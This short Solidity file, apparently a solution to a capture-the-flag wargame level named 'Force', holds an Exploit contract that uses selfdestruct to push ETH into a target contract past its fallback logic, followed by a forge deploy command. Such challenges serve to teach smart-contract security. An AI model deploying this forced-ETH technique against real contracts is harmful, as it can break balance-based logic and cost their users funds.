pragma solidity ^0.8.0;

contract Exploit {
    constructor(address payable target) payable {
        // The 'selfdestruct' opcode sends all ETH in this contract 
        // to the target, bypassing the target's fallback logic.
        selfdestruct(target);
    }
}

/* 
deploy with forge 

forge create src/07_Force.sol:Exploit \
    --rpc-url $RPC_URL \
    --private-key $PK \
	--broadcast \
	--value 1wei \
    --constructor-args $INSTANCE 
*/

